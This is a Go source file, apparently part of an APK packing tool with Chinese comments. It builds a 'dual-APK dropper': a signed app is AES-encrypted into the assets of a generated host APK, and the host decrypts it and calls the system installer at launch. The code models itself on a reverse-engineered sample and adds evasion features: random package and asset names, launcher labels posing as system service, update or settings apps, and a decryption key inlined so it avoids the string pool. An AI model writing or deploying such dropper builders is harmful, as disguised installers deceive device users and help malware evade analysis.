package pipeline

// B9 双 APK 投放器：把已签名的原应用整体加密为「插件」放进宿主 assets，
// 宿主启动后解密落地并用 PackageInstaller 会话调起系统安装器。
//
// 架构对齐参考样本 sample.apk（见 docs/样本逆向-手法清单.md 第 0 节）：
//
//	[宿主 APK] 包名由 seed 派生
//	   ├ AndroidManifest.xml：REQUEST_INSTALL_PACKAGES + INTERNET、launcher activity
//	   ├ classes.dex：宿主自己的解密/落地/安装逻辑（不含任何 dalvik/system/*）
//	   └ assets/<随机名>.zip：AES-256-CBC(原应用 APK)，运行时落地到
//	     getExternalFilesDir()/plugins/<随机名>.apk 后进入 PackageInstaller 会话
//
// 为什么放在 Sink 而不是普通 Pass：插件必须是**已签名**的完整 APK，而签名
// （E1）发生在流水线的最后一步。因此 B9 在 sink 里对「已经走完全部加固与签名
// 流程」的产物做第二次封装：先加密插件，再生成宿主归档，最后用同一密钥库给
// 宿主签名。`passes.B9` 只负责启用与前置校验。
//
// 关闭 -dual-apk 时本文件的任何函数都不会被调用，产物逐字节不变。

import (
	"crypto/sha256"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"hash/fnv"
	"math/rand"
	"strings"

	"apkguard/internal/axml"
	"apkguard/internal/config"
	"apkguard/internal/dex"
	"apkguard/internal/pack"
	"apkguard/internal/zipx"
)

// dualAPKHostMinSDK 是宿主 APK 声明的 minSdkVersion。
//
// 取 24：PackageInstaller 会话（API 21+）与 getExternalFilesDir 都满足，
// 同时 24 与 DEX 037（Android 7.0+）一致——宿主 DEX 由 dex.Build 生成，
// 版本 037 在更低版本上可能被拒。
const dualAPKHostMinSDK = 24

// sharedKeyPluginAPK 是已签名的「插件 APK」在 Artifact.Shared 里的键。
//
// 它是 B9 的中间产物：既是宿主 assets 里的明文（加密前）来源，也便于
// 测试与后续调用方取回。最终的交付形态是宿主 APK（Result.APK）。
const sharedKeyPluginAPK = "B9.pluginAPK"

// B9 宿主 DEX 里使用的常量。
const (
	// dualAPKPendingFlags 是 PendingIntent.getActivity 的 flags。
	//
	// PendingIntent 的常量值是 1<<n 的位，容易记错：
	//   FLAG_ONE_SHOT=0x40000000、FLAG_NO_CREATE=0x20000000、
	//   FLAG_CANCEL_CURRENT=0x10000000、FLAG_UPDATE_CURRENT=0x08000000、
	//   FLAG_IMMUTABLE=0x04000000、FLAG_MUTABLE=0x02000000。
	//
	// 这里必须是 UPDATE_CURRENT|MUTABLE：
	//   - MUTABLE：PackageInstaller 要把 EXTRA_STATUS/EXTRA_INTENT 填进这个
	//     Intent，targetSdk ≥ 31 的应用不显式给可变标志时会抛异常；
	//   - **绝不能**带 0x04000000（那是 FLAG_IMMUTABLE）：API 31+ 同时设置
	//     IMMUTABLE|MUTABLE 时 PendingIntent.getActivity 直接抛
	//     IllegalArgumentException("Cannot set both FLAG_IMMUTABLE and FLAG_MUTABLE")。
	dualAPKFlagUpdateCurrent = 0x08000000
	dualAPKFlagMutable       = 0x02000000
	dualAPKPendingFlags      = dualAPKFlagUpdateCurrent | dualAPKFlagMutable

	// 下列 magic 常量只用于「组装后定位并改写占位指令」：
	// 先让汇编器生成等宽的 35c/31i 占位指令，再在字流里按 magic 找到它，
	// 原地改写成 3rc（invoke-*-range）与 const-wide/16。字长不变，
	// 因此分支偏移与符号补丁位置都不受影响。
	dualAPKMagicOff    = 0x0B9D0001
	dualAPKMagicLen    = 0x0B9D0002
	dualAPKMagicInvoke = 0x0B9D0003

	dualAPKStatusExtra = "android.content.pm.extra.STATUS"
	dualAPKIntentExtra = "android.intent.extra.INTENT"
)

// buildDualAPKHost 把已签名的插件 APK 封装成宿主 APK（未签名）。
//
// pluginAPK 是走完 E1/E2 的完整产物；art 仍是插件内容的 Artifact（用于读
// 包名/Manifest 信息与记账）；alignOpts 与 sink 写插件时使用的一致。
func buildDualAPKHost(pluginAPK []byte, art *Artifact, opts *config.Options, alignOpts zipx.AlignOptions) ([]byte, error) {
	if len(pluginAPK) == 0 {
		return nil, fmt.Errorf("插件 APK 为空")
	}
	pluginPkg := dualAPKManifestPackage(art)
	if pluginPkg == "" {
		return nil, fmt.Errorf("无法从产物 AndroidManifest.xml 读出包名，宿主无法生成（插件 Manifest 缺失或不可解析）")
	}
	if min := manifestMinSDK(art); min > 0 && min < dualAPKHostMinSDK {
		// 不构成错误：宿主自身 minSdk 固定 24，与插件无关；仅提示。
		art.Note("B9 提示：插件 Manifest 的 minSdkVersion=%d 低于宿主声明的 %d，宿主本身仍可在 API 24+ 运行", min, dualAPKHostMinSDK)
	}

	// 命名与随机材料：seed 非空时完全确定性；为空时退化为插件内容摘要，
	// 保证同一输入可复现（与 B1 的 DexKey 空值随机语义无关，这里不涉及密钥材料的随机性）。
	material := opts.Seed
	if material == "" {
		sum := sha256.Sum256(pluginAPK)
		material = hex.EncodeToString(sum[:8])
	}
	rnd := rand.New(rand.NewSource(int64(dualAPKHash(material + "|apkguard/b9"))))

	hostPkg := dualAPKHostPackageName(rnd)
	slash := strings.ReplaceAll(hostPkg, ".", "/")
	appClass := "L" + slash + "/A;"
	actClass := "L" + slash + "/B;"
	assetKey := dualAPKAssetName(rnd)
	pluginFile := strings.TrimSuffix(assetKey, ".zip") + ".apk"
	label := dualAPKLabel(rnd)

	// 插件密钥：与 B1/C1 的载荷密钥**域分离**，只服务于 B9 的插件容器。
	// 宿主 DEX 内联这把密钥（以字节数组构造，不在字符串池里留明文），
	// 因此插件密文的可读性只取决于宿主 DEX 的反编译难度——与样本同一模型，
	// 但加密是 AES-256-CBC 而非单字节 XOR。
	key, err := dualAPKPluginKey(opts)
	if err != nil {
		return nil, err
	}
	iv := pack.IVFromSeed(material + "|apkguard/b9/iv")
	blob, err := pack.Encrypt(pluginAPK, key, iv)
	if err != nil {
		return nil, fmt.Errorf("插件加密失败: %w", err)
	}

	mf := dualAPKManifest(dualAPKManifestSpec{
		Pkg:       hostPkg,
		Label:     label,
		AppClass:  strings.ReplaceAll(strings.TrimSuffix(strings.TrimPrefix(appClass, "L"), ";"), "/", "."),
		ActClass:  strings.ReplaceAll(strings.TrimSuffix(strings.TrimPrefix(actClass, "L"), ";"), "/", "."),
		Perms:     []string{"android.permission.REQUEST_INSTALL_PACKAGES", "android.permission.INTERNET"},
		MinSDK:    dualAPKHostMinSDK,
		TargetSDK: 33,
	})
	hostDex, err := dualAPKBuildHostDex(dualAPKDexSpec{
		ActClass:   actClass,
		AssetKey:   assetKey,
		PluginFile: pluginFile,
		// 必须读入完整 blob（IV‖密文）：decrypt 从首 16 字节取 IV，再对
		// 其余部分做 doFinal。少读一个分组就是「最后一个密文块丢失」，
		// 在设备上表现为 BadPaddingException/解密失败（结构校验看不出来）。
		PluginSize: len(blob),
		PluginDrop: 0,
		Key:        key,
		TextUpdate: "正在调起系统安装程序…",
		TextDone:   "组件安装完成",
		TextFail:   "组件安装未完成，请重新打开本应用重试",
	})
	if err != nil {
		return nil, fmt.Errorf("宿主 DEX 生成失败: %w", err)
	}

	stamp, err := opts.UnifiedStamp()
	if err != nil {
		return nil, err
	}
	tm, dt := zipx.DOSDateTime(stamp)
	archive := &zipx.Archive{}
	// 顺序与真实构建产物一致：Manifest 在最前；assets 条目名用「包名去点 + .zip」
	// 形态（样本为 nupyoknyyqfzjtrpkscz.zip），内容是不可压缩的密文。
	archive.Entries = append(archive.Entries,
		zipx.NewStoredAt("AndroidManifest.xml", mf, tm, dt),
		zipx.NewStoredAt("classes.dex", hostDex, tm, dt),
		zipx.NewStoredAt("assets/"+assetKey, blob, tm, dt),
	)
	host, err := zipx.WriteChecked(archive, alignOpts)
	if err != nil {
		return nil, fmt.Errorf("宿主归档写出失败: %w", err)
	}

	sum := sha256.Sum256(pluginAPK)
	actName := strings.TrimSuffix(strings.TrimPrefix(actClass, "L"+slash+"/"), ";")
	art.Note("B9 双 APK 投放器：产物改为宿主 APK（包名 %s，launcher %s.%s，%d 字节）；"+
		"原应用（包名 %s，%d 字节，sha256 %s）已签名后经 AES-256-CBC 加密为宿主条目 assets/%s（%d 字节，IV 由 seed 派生，密钥以字节数组内联在宿主 DEX）；"+
		"宿主启动后解密落地到 getExternalFilesDir()/plugins/%s，再用 PackageInstaller 会话（SESSION，MODE_FULL_INSTALL）调起系统安装器——"+
		"需要 REQUEST_INSTALL_PACKAGES，首次安装必须由用户在系统界面确认；宿主是独立包名，不会覆盖升级原应用",
		hostPkg, hostPkg, actName, len(host),
		pluginPkg, len(pluginAPK), hex.EncodeToString(sum[:8]), assetKey, len(blob), pluginFile)
	art.Stat("B9.host_pkg", hostPkg)
	art.Stat("B9.host_bytes", fmt.Sprint(len(host)))
	art.Stat("B9.plugin_pkg", pluginPkg)
	art.Stat("B9.plugin_bytes", fmt.Sprint(len(pluginAPK)))
	art.Stat("B9.plugin_sha256", hex.EncodeToString(sum[:]))
	art.Stat("B9.asset", "assets/"+assetKey)
	art.Stat("B9.blob_bytes", fmt.Sprint(len(blob)))
	art.Stat("B9.host_dex_bytes", fmt.Sprint(len(hostDex)))
	return host, nil
}

// dualAPKManifestPackage 从 Artifact 的 AndroidManifest.xml 读出 package 名。
func dualAPKManifestPackage(art *Artifact) string {
	e := Find(art, "AndroidManifest.xml")
	if e == nil {
		return ""
	}
	data, err := e.Data()
	if err != nil {
		return ""
	}
	f, err := axml.Parse(data)
	if err != nil {
		return ""
	}
	root := f.FindElement("manifest")
	if root == nil {
		return ""
	}
	return strings.TrimSpace(root.AttrString("package"))
}

// dualAPKHash 是一个稳定的字符串散列（FNV-1a）。
func dualAPKHash(s string) uint32 {
	h := fnv.New32a()
	_, _ = h.Write([]byte(s))
	return h.Sum32()
}

// dualAPKPluginKey 派生插件容器的 AES-256 密钥。
//
// 与 B1 的载荷密钥同源规则：指定 -dex-key 时按域分离串派生（可复现），
// 否则随机生成。密钥最终以内联字节数组的形式写进宿主 DEX，因此不落盘、
// 不进字符串池，也不依赖运行时输入。
func dualAPKPluginKey(opts *config.Options) ([pack.KeySize]byte, error) {
	if opts.DexKey != "" {
		return pack.Key(opts.DexKey + "|apkguard/b9/plugin")
	}
	return pack.RandomKey()
}

// dualAPKHostPackageName 由随机源派生出宿主包名（形如 com.<seg>.<seg>）。
func dualAPKHostPackageName(rnd *rand.Rand) string {
	seg := func(n int) string {
		const alpha = "abcdefghijklmnopqrstuvwxyz"
		out := make([]byte, n)
		for i := range out {
			out[i] = alpha[rnd.Intn(len(alpha))]
		}
		return string(out)
	}
	return "com." + seg(5+rnd.Intn(4)) + "." + seg(5+rnd.Intn(5))
}

// dualAPKAssetName 生成宿主 assets 里的插件条目名（相对 assets/ 的路径）。
func dualAPKAssetName(rnd *rand.Rand) string {
	seg := func(n int) string {
		const alpha = "abcdefghijklmnopqrstuvwxyz0123456789"
		out := make([]byte, n)
		for i := range out {
			out[i] = alpha[rnd.Intn(len(alpha))]
		}
		return string(out)
	}
	return seg(8) + seg(6) + ".zip"
}

// dualAPKLabel 生成宿主在启动器里的显示名。
func dualAPKLabel(rnd *rand.Rand) string {
	words := []string{"系统服务", "设备助手", "组件更新", "Settings", "Update", "Service", "Backup"}
	return words[rnd.Intn(len(words))]
}

// ---- 宿主 Manifest（AXML 从零构造）----

// dualAPKAttrResID 是宿主 Manifest 用到的 android 框架属性资源 ID。
//
// 值取自公开 SDK 常量，已用 aapt2 对真实 APK（dhizuku/termux/rustdesk）
// 逐个核对。**不是可选项**：框架解析有命名空间的属性走
// XmlBlock 的 getAttributeNameResID()，索引落在 resource map 之外就返回 0，
// 属性会被整体忽略（例如包名/组件名读不到，安装直接失败）。
var dualAPKAttrResID = map[string]uint32{
	"name":             0x01010003,
	"label":            0x01010001,
	"exported":         0x01010010,
	"launchMode":       0x0101001d,
	"allowBackup":      0x01010280,
	"minSdkVersion":    0x0101020c,
	"targetSdkVersion": 0x01010270,
}

// dualAPKManifestSpec 描述宿主 Manifest 的内容。
type dualAPKManifestSpec struct {
	Pkg       string
	Label     string
	AppClass  string // 点分全限定名
	ActClass  string
	Perms     []string
	MinSDK    uint32
	TargetSDK uint32
}

// dualAPKAttr 是构造 AXML 属性表用的一条属性（直接携带池索引与 Res_value）。
type dualAPKAttr struct {
	ns    uint32
	name  uint32
	raw   uint32
	dtype byte
	data  uint32
}

// dualAPKManifest 从零生成一份合法、可安装的宿主 AndroidManifest.xml。
//
// 与 A16 的 decoyManifestAXML 的关键差别（因此没有直接复用）：
//   - 它必须带 RES_XML_RESOURCE_MAP（属性按资源 ID 解析，见 dualAPKAttrResID）；
//   - 包名、组件名、权限都由调用方指定，而不是随机假内容；
//   - 结构对齐真实 aapt2 产物：pool → resource map → startNS → 元素树。
//
// 只使用 axml 包已导出的常量与 EncodeStringPool；块布局与 decoycore.go
// 的构造器同构（pipeline 包不能 import passes，避免依赖倒挂）。
func dualAPKManifest(sp dualAPKManifestSpec) []byte {
	noIdx := uint32(0xffffffff)
	strs := []string{"", "android", axml.AndroidNS}
	idx := map[string]uint32{"": 0, "android": 1, axml.AndroidNS: 2}
	intern := func(s string) uint32 {
		if i, ok := idx[s]; ok {
			return i
		}
		i := uint32(len(strs))
		idx[s] = i
		strs = append(strs, s)
		return i
	}

	// 先登记元素名与属性名，再登记取值：池索引顺序固定、可复现。
	for _, n := range []string{"manifest", "uses-permission", "uses-sdk", "application",
		"activity", "intent-filter", "action", "category"} {
		intern(n)
	}
	attrNameIdx := map[string]uint32{}
	for _, n := range []string{"package", "name", "label", "exported", "launchMode", "allowBackup", "minSdkVersion", "targetSdkVersion"} {
		attrNameIdx[n] = intern(n)
	}
	pkgIdx := intern(sp.Pkg)
	labelIdx := intern(sp.Label)
	appIdx := intern(sp.AppClass)
	actIdx := intern(sp.ActClass)
	permIdx := make([]uint32, 0, len(sp.Perms))
	for _, p := range sp.Perms {
		permIdx = append(permIdx, intern(p))
	}
	mainIdx := intern("android.intent.action.MAIN")
	catIdx := intern("android.intent.category.LAUNCHER")

	nsNone := noIdx
	nsAndroid := idx[axml.AndroidNS]

	strAttr := func(ns uint32, name string, val uint32) dualAPKAttr {
		return dualAPKAttr{ns: ns, name: attrNameIdx[name], raw: val, dtype: axml.TypeString, data: val}
	}
	boolAttr := func(name string, v bool) dualAPKAttr {
		var d uint32
		if v {
			d = 1
		}
		return dualAPKAttr{ns: nsAndroid, name: attrNameIdx[name], raw: noIdx, dtype: axml.TypeIntBoolean, data: d}
	}
	intAttr := func(name string, v uint32) dualAPKAttr {
		return dualAPKAttr{ns: nsAndroid, name: attrNameIdx[name], raw: noIdx, dtype: axml.TypeIntDec, data: v}
	}

	startEl := func(name string, attrs []dualAPKAttr) []byte {
		return dualAPKNode(axml.TypeXMLStartElem, dualAPKElemBody(nsNone, idx[name], attrs))
	}
	endEl := func(name string) []byte {
		return dualAPKNode(axml.TypeXMLEndElem, dualAPKLe32(nsNone, idx[name]))
	}
	startNS := dualAPKNode(axml.TypeXMLStartNS, dualAPKLe32(1, idx[axml.AndroidNS]))
	endNS := dualAPKNode(axml.TypeXMLEndNS, dualAPKLe32(1, idx[axml.AndroidNS]))

	body := make([]byte, 0, 1024)
	body = append(body, startNS...)
	body = append(body, startEl("manifest", []dualAPKAttr{
		strAttr(nsNone, "package", pkgIdx),
	})...)
	for _, p := range permIdx {
		body = append(body, startEl("uses-permission", []dualAPKAttr{
			strAttr(nsAndroid, "name", p),
		})...)
		body = append(body, endEl("uses-permission")...)
	}
	body = append(body, startEl("uses-sdk", []dualAPKAttr{
		intAttr("minSdkVersion", sp.MinSDK),
		intAttr("targetSdkVersion", sp.TargetSDK),
	})...)
	body = append(body, endEl("uses-sdk")...)
	body = append(body, startEl("application", []dualAPKAttr{
		strAttr(nsAndroid, "name", appIdx),
		strAttr(nsAndroid, "label", labelIdx),
		boolAttr("allowBackup", false),
	})...)
	body = append(body, startEl("activity", []dualAPKAttr{
		strAttr(nsAndroid, "name", actIdx),
		boolAttr("exported", true),
		// launchMode 是 enum 属性：aapt 把 "singleTop" 编译成 TYPE_INT_DEC=1
		// （ActivityInfo.LAUNCH_SINGLE_TOP）。若写成 TYPE_STRING，框架的
		// TypedArray.getInt 对非数字字符串会抛异常，包解析直接失败、装不上。
		intAttr("launchMode", 1),
	})...)
	body = append(body, startEl("intent-filter", nil)...)
	// action/category 的 name 必须带 android 命名空间：框架用
	// getAttributeValue(ANDROID_NS, "name") 读取，ns=None 时读不到，
	// 结果是 launcher intent-filter 空转（能装但没有启动图标）。
	body = append(body, startEl("action", []dualAPKAttr{strAttr(nsAndroid, "name", mainIdx)})...)
	body = append(body, endEl("action")...)
	body = append(body, startEl("category", []dualAPKAttr{strAttr(nsAndroid, "name", catIdx)})...)
	body = append(body, endEl("category")...)
	body = append(body, endEl("intent-filter")...)
	body = append(body, endEl("activity")...)
	body = append(body, endEl("application")...)
	body = append(body, endEl("manifest")...)
	body = append(body, endNS...)

	pool := axml.EncodeStringPool(strs, true)
	resMap := dualAPKResourceMap(strs)
	out := make([]byte, 8, 8+len(pool)+len(resMap)+len(body))
	binary.LittleEndian.PutUint16(out[0:], axml.TypeXML)
	binary.LittleEndian.PutUint16(out[2:], 8)
	out = append(out, pool...)
	out = append(out, resMap...)
	out = append(out, body...)
	binary.LittleEndian.PutUint32(out[4:], uint32(len(out)))
	return out
}

// dualAPKResourceMap 生成 RES_XML_RESOURCE_MAP：按字符串池索引对齐的资源 ID 数组。
//
// 长度取整个池（非属性名处填 0）。aapt 的紧凑写法只覆盖到最后一个属性名，
// 但按池索引全量给出同样合法（axml 的 buildResourceMap 也只要求「不超过池大小」），
// 且对任意池顺序都安全。非 0 项必须恰好落在属性名上。
func dualAPKResourceMap(strs []string) []byte {
	blob := make([]byte, 8+4*len(strs))
	binary.LittleEndian.PutUint16(blob[0:], axml.TypeXMLResource)
	binary.LittleEndian.PutUint16(blob[2:], 8)
	binary.LittleEndian.PutUint32(blob[4:], uint32(len(blob)))
	for i, s := range strs {
		if id, ok := dualAPKAttrResID[s]; ok {
			binary.LittleEndian.PutUint32(blob[8+4*i:], id)
		}
	}
	return blob
}

// dualAPKElemBody 组装 ResXMLTree_attrExt + 属性表。
//
// 布局与 axml/write.go 的 encodeStartElement / decoycore.go 的 decoyElemBody
// 一致：attributeStart 恒为 20。写错会让解析器按错误步长遍历。
func dualAPKElemBody(ns, name uint32, attrs []dualAPKAttr) []byte {
	ext := make([]byte, 20)
	binary.LittleEndian.PutUint32(ext[0:], ns)
	binary.LittleEndian.PutUint32(ext[4:], name)
	binary.LittleEndian.PutUint16(ext[8:], 20)  // attributeStart
	binary.LittleEndian.PutUint16(ext[10:], 20) // attributeSize
	binary.LittleEndian.PutUint16(ext[12:], uint16(len(attrs)))
	binary.LittleEndian.PutUint16(ext[14:], 0) // idIndex
	binary.LittleEndian.PutUint16(ext[16:], 0) // classIndex
	binary.LittleEndian.PutUint16(ext[18:], 0) // styleIndex
	out := append([]byte(nil), ext...)
	for _, at := range attrs {
		e := make([]byte, 20)
		binary.LittleEndian.PutUint32(e[0:], at.ns)
		binary.LittleEndian.PutUint32(e[4:], at.name)
		binary.LittleEndian.PutUint32(e[8:], at.raw)
		binary.LittleEndian.PutUint16(e[12:], 8) // Res_value.size
		e[15] = at.dtype
		binary.LittleEndian.PutUint32(e[16:], at.data)
		out = append(out, e...)
	}
	return out
}

// dualAPKNode 组装一个 ResXMLTree_node（header + lineNumber + comment + body）。
func dualAPKNode(typ uint16, body []byte) []byte {
	out := make([]byte, 0, 16+len(body))
	hdr := make([]byte, 8)
	binary.LittleEndian.PutUint16(hdr[0:], typ)
	binary.LittleEndian.PutUint16(hdr[2:], 16)
	binary.LittleEndian.PutUint32(hdr[4:], uint32(16+len(body)))
	out = append(out, hdr...)
	ln := make([]byte, 8)
	out = append(out, ln...) // lineNumber=0、comment=0x00000000（与 aapt 的常见取值兼容）
	out = append(out, body...)
	return out
}

// dualAPKLe32 把小端 uint32 依次打包。
func dualAPKLe32(vals ...uint32) []byte {
	out := make([]byte, 0, len(vals)*4)
	for _, v := range vals {
		var b [4]byte
		binary.LittleEndian.PutUint32(b[:], v)
		out = append(out, b[:]...)
	}
	return out
}

// ---- 宿主 DEX（用 dex.Asm 原语手工拼出 Java 逻辑）----

// 宿主代码引用的类型描述符。
const (
	dualAPKCtxDesc      = "Landroid/content/Context;"
	dualAPKFileDesc     = "Ljava/io/File;"
	dualAPKAmDesc       = "Landroid/content/res/AssetManager;"
	dualAPKInDesc       = "Ljava/io/InputStream;"
	dualAPKFosDesc      = "Ljava/io/FileOutputStream;"
	dualAPKOsDesc       = "Ljava/io/OutputStream;"
	dualAPKByteArrDesc  = "[B"
	dualAPKStrDesc      = "Ljava/lang/String;"
	dualAPKIntentDesc   = "Landroid/content/Intent;"
	dualAPKClassDesc    = "Ljava/lang/Class;"
	dualAPKPmDesc       = "Landroid/content/pm/PackageManager;"
	dualAPKPiDesc       = "Landroid/content/pm/PackageInstaller;"
	dualAPKSpDesc       = "Landroid/content/pm/PackageInstaller$SessionParams;"
	dualAPKSessDesc     = "Landroid/content/pm/PackageInstaller$Session;"
	dualAPKPendDesc     = "Landroid/app/PendingIntent;"
	dualAPKSenderDesc   = "Landroid/content/IntentSender;"
	dualAPKParcelable   = "Landroid/os/Parcelable;"
	dualAPKCharSeqDesc  = "Ljava/lang/CharSequence;"
	dualAPKToastDesc    = "Landroid/widget/Toast;"
	dualAPKBundleDesc   = "Landroid/os/Bundle;"
	dualAPKKeyIface     = "Ljava/security/Key;"
	dualAPKAlgoSpecDesc = "Ljava/security/spec/AlgorithmParameterSpec;"
	dualAPKCipherDesc   = "Ljavax/crypto/Cipher;"
	dualAPKSecretKey    = "Ljavax/crypto/spec/SecretKeySpec;"
	dualAPKIvSpecDesc   = "Ljavax/crypto/spec/IvParameterSpec;"
)

// 宿主类的访问标志。
const (
	dualAPKAccPublic    = 0x0001
	dualAPKAccPrivate   = 0x0002
	dualAPKAccProtected = 0x0004
	dualAPKAccStatic    = 0x0008
)

// dualAPKDexSpec 描述宿主 DEX 的常量与标识。
type dualAPKDexSpec struct {
	ActClass   string // Activity 类描述符
	AssetKey   string // AssetManager.open 用的相对路径
	PluginFile string // 落地文件名
	PluginSize int    // 密文字节数（含 IV）
	PluginDrop int    // 解密时尾部忽略的字节数（0：无 MAC）
	Key        [pack.KeySize]byte
	TextUpdate string
	TextDone   string
	TextFail   string
}

// dualAPKBuildHostDex 生成宿主 classes.dex：一个 Application 子类 + 一个
// Activity 子类（解密落地 + PackageInstaller 会话 + 安装结果处理）。
//
// 等价 Java（生成结果与其语义一致）：
//
//	class B extends Activity {
//	    static boolean s;
//	    void onCreate(Bundle b) { super.onCreate(b); status(this, getIntent()); run(this); }
//	    void onNewIntent(Intent i) { super.onNewIntent(i); s = false; status(this, i); }
//	    static void run(Context c) { if (s) return; s = true; install(c, drop(c)); }
//	    static byte[] drop(Context c) { ...解密 assets 并落地 getExternalFilesDir()/plugins/... }
//	    static void install(Context c, byte[] d) { ...PackageInstaller SESSION... }
//	    static void status(Context c, Intent i) { ...PENDING_USER_ACTION 转交安装界面... }
//	}
//
// 不引用任何 dalvik/system/*（与参考样本一致），也不含 WebView。
func dualAPKBuildHostDex(sp dualAPKDexSpec) ([]byte, error) {
	ac := sp.ActClass
	appClass := strings.TrimSuffix(ac, "/B;") // 同包 A 类；由调用方保证命名约定
	if !strings.HasSuffix(ac, "/B;") {
		return nil, fmt.Errorf("宿主 Activity 类名不符合 <pkg>/B; 约定: %q", ac)
	}
	appClass += "/A;"

	appCtor, err := dualAPKCtorCode("Landroid/app/Application;")
	if err != nil {
		return nil, err
	}
	actCtor, err := dualAPKCtorCode("Landroid/app/Activity;")
	if err != nil {
		return nil, err
	}
	onCreate, err := dualAPKOnCreateCode(ac)
	if err != nil {
		return nil, err
	}
	onNew, err := dualAPKOnNewIntentCode(ac)
	if err != nil {
		return nil, err
	}
	run, err := dualAPKRunCode(ac)
	if err != nil {
		return nil, err
	}
	drop, err := dualAPKDropCode(ac, sp)
	if err != nil {
		return nil, err
	}
	install, err := dualAPKInstallCode(ac)
	if err != nil {
		return nil, err
	}
	readM, err := dualAPKReadCode()
	if err != nil {
		return nil, err
	}
	decM, err := dualAPKDecryptCode()
	if err != nil {
		return nil, err
	}
	status, err := dualAPKStatusCode(sp)
	if err != nil {
		return nil, err
	}

	add := dex.Addition{Classes: []dex.ClassSpec{
		{
			Name:   appClass,
			Super:  "Landroid/app/Application;",
			Access: dualAPKAccPublic,
			Methods: []dex.ClassMethod{
				{Name: "<init>", Proto: dex.ProtoSpec{Ret: "V"}, Access: dualAPKAccPublic, Code: appCtor},
			},
		},
		{
			Name:   ac,
			Super:  "Landroid/app/Activity;",
			Access: dualAPKAccPublic,
			Fields: []dex.ClassField{{Name: "s", Type: "Z", Access: dualAPKAccStatic | dualAPKAccPrivate}},
			Methods: []dex.ClassMethod{
				{Name: "<init>", Proto: dex.ProtoSpec{Ret: "V"}, Access: dualAPKAccPublic, Code: actCtor},
				{Name: "onCreate", Proto: dex.ProtoSpec{Ret: "V", Params: []string{dualAPKBundleDesc}}, Access: dualAPKAccPublic, Code: onCreate},
				{Name: "onNewIntent", Proto: dex.ProtoSpec{Ret: "V", Params: []string{dualAPKIntentDesc}}, Access: dualAPKAccProtected, Code: onNew},
				{Name: "run", Proto: dex.ProtoSpec{Ret: "V", Params: []string{dualAPKCtxDesc}}, Access: dualAPKAccStatic | dualAPKAccPrivate, Code: run},
				{Name: "drop", Proto: dex.ProtoSpec{Ret: dualAPKByteArrDesc, Params: []string{dualAPKCtxDesc}}, Access: dualAPKAccStatic | dualAPKAccPrivate, Code: drop},
				{Name: "install", Proto: dex.ProtoSpec{Ret: "V", Params: []string{dualAPKCtxDesc, dualAPKByteArrDesc}}, Access: dualAPKAccStatic | dualAPKAccPrivate, Code: install},
				{Name: "read", Proto: dex.ProtoSpec{Ret: dualAPKByteArrDesc, Params: []string{dualAPKInDesc, "I"}}, Access: dualAPKAccStatic | dualAPKAccPrivate, Code: readM},
				{Name: "decrypt", Proto: dex.ProtoSpec{Ret: dualAPKByteArrDesc, Params: []string{dualAPKByteArrDesc, dualAPKByteArrDesc, "I"}}, Access: dualAPKAccStatic | dualAPKAccPrivate, Code: decM},
				{Name: "status", Proto: dex.ProtoSpec{Ret: "V", Params: []string{dualAPKCtxDesc, dualAPKIntentDesc}}, Access: dualAPKAccStatic | dualAPKAccPrivate, Code: status},
			},
		},
	}}
	return dex.Build(add)
}

// dualAPKAssemble 汇总汇编结果，并可对指令字流做一次原地改写。
func dualAPKAssemble(regs, ins, outs int, a *dex.Asm, post func([]uint16) error) (*dex.CodeBlob, error) {
	insns, patches, err := a.Assemble()
	if err != nil {
		return nil, err
	}
	if post != nil {
		if err := post(insns); err != nil {
			return nil, err
		}
	}
	return &dex.CodeBlob{
		Registers: uint16(regs), Ins: uint16(ins), Outs: uint16(outs),
		Insns: insns, Patches: patches,
	}, nil
}

// dualAPKCtorCode 生成 <init>()V：调用直接父类的无参构造器。
func dualAPKCtorCode(super string) (*dex.CodeBlob, error) {
	a := dex.NewAsm()
	if err := a.InvokeDirect([]int{1}, dex.MethodSpec{Class: super, Name: "<init>", Proto: dex.ProtoSpec{Ret: "V"}}); err != nil {
		return nil, err
	}
	a.ReturnVoid()
	return dualAPKAssemble(2, 1, 1, a, nil)
}

// dualAPKOnCreateCode 生成 onCreate(Bundle)V。
func dualAPKOnCreateCode(self string) (*dex.CodeBlob, error) {
	a := dex.NewAsm()
	if err := a.InvokeSuper([]int{2, 3}, dex.MethodSpec{
		Class: "Landroid/app/Activity;", Name: "onCreate",
		Proto: dex.ProtoSpec{Ret: "V", Params: []string{dualAPKBundleDesc}},
	}); err != nil {
		return nil, err
	}
	if err := a.InvokeVirtual([]int{2}, dex.MethodSpec{
		Class: "Landroid/app/Activity;", Name: "getIntent",
		Proto: dex.ProtoSpec{Ret: dualAPKIntentDesc},
	}); err != nil {
		return nil, err
	}
	a.MoveResultObject(0)
	if err := a.InvokeStatic([]int{2, 0}, dex.MethodSpec{
		Class: self, Name: "status",
		Proto: dex.ProtoSpec{Ret: "V", Params: []string{dualAPKCtxDesc, dualAPKIntentDesc}},
	}); err != nil {
		return nil, err
	}
	if err := a.InvokeStatic([]int{2}, dex.MethodSpec{
		Class: self, Name: "run",
		Proto: dex.ProtoSpec{Ret: "V", Params: []string{dualAPKCtxDesc}},
	}); err != nil {
		return nil, err
	}
	a.ReturnVoid()
	return dualAPKAssemble(4, 2, 2, a, nil)
}

// dualAPKOnNewIntentCode 生成 onNewIntent(Intent)V：接收安装器回传的状态。
func dualAPKOnNewIntentCode(self string) (*dex.CodeBlob, error) {
	a := dex.NewAsm()
	if err := a.InvokeSuper([]int{2, 3}, dex.MethodSpec{
		Class: "Landroid/app/Activity;", Name: "onNewIntent",
		Proto: dex.ProtoSpec{Ret: "V", Params: []string{dualAPKIntentDesc}},
	}); err != nil {
		return nil, err
	}
	a.Const4(0, 0)
	a.SPut(0, dex.FieldSpec{Class: self, Name: "s", Type: "Z"})
	if err := a.InvokeStatic([]int{2, 3}, dex.MethodSpec{
		Class: self, Name: "status",
		Proto: dex.ProtoSpec{Ret: "V", Params: []string{dualAPKCtxDesc, dualAPKIntentDesc}},
	}); err != nil {
		return nil, err
	}
	a.ReturnVoid()
	return dualAPKAssemble(4, 2, 2, a, nil)
}

// dualAPKRunCode 生成 run(Context)V：进程内只触发一次落地 + 安装会话。
func dualAPKRunCode(self string) (*dex.CodeBlob, error) {
	a := dex.NewAsm()
	a.SGet(0, dex.FieldSpec{Class: self, Name: "s", Type: "Z"})
	a.IfNez(0, "end")
	a.Const4(0, 1)
	a.SPut(0, dex.FieldSpec{Class: self, Name: "s", Type: "Z"})
	if err := a.InvokeStatic([]int{3}, dex.MethodSpec{
